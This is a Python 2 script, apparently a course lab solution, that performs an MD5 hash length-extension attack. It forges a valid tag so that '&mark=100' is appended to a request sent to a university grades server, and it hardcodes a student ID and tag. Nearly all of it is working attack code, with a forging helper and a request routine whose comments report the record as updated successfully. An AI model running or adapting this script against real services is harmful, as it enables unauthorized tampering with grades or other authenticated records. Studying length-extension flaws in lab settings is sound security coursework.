import httplib, urlparse, urllib
from md5p import md5, padding

###############
### attack ####
###############

def attack(url, tag, sid, mark):  
    # parameter url is the attack url you construct
    parsedURL = urlparse.urlparse(url)

    # open a connection to the server
    httpconn = httplib.HTTPConnection(parsedURL.hostname, parsedURL.port)
    
    # my sid etc
    ext = "&sid=" + sid + "&mark=" + mark
    sid = "&sid=" + sid
    
    h, msg =  forgeIllegalPayload(sid, tag, ext)
    
    # the query
    query = parsedURL.path + "?tag=" + h + msg

    # issue server-API request
    httpconn.request("GET", query)

    # httpresp is response object containing a status value and possible message
    httpresp = httpconn.getresponse()

    # valid request will result in httpresp.status value 200
    print httpresp.status

    # in the case of a valid request, print the server's message
    # It shows record updated successfully
    # It worked!
    print httpresp.read()
    
    # return the url that made the attack successul 
    return(query)


# helper function
def forgeIllegalPayload(message, token, extension):
    '''
    In this function, you are not allowed to:
    - call the function createToken
    - use the secret key
    However, you might know the length of the secret key (6)
    '''
    h = md5(state=token.decode('hex'), count=512)
    h.update(extension)
    return h.hexdigest(), message + urllib.quote(padding((11 + len(message))*8)) + extension
  

#############
### main ####
#############

if __name__ == "__main__":
    url = "http://grades.cms-weblab.utsc.utoronto.ca/"
    tag = "f092d8229cfdde32632bad77c01b4b64"
    sid = "1001157008"
    mark = "100"
    
    print(attack(url, tag, sid, mark))